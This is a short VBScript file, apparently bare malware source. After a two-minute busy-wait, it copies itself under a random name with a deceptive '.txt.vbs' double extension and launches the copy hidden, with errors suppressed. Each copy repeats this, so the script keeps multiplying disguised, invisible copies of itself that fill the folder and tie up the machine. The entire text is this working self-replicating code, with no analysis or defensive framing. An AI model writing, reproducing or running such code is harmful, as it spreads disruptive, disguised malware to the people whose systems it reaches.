Randomize: On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set Shell = CreateObject("WScript.Shell")
Set HOME = FSO.GetFolder(".")

Rest 120

Set Me_ = FSO.GetFile(WScript.ScriptFullName)
Baby = HOME & "\" & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & ".txt.vbs"
Me_.Copy(Baby)
Shell.Run Baby, VbHide

Sub Rest(HowLong)
Current = Timer
Do While Timer - Current < HowLong
Loop
End Sub
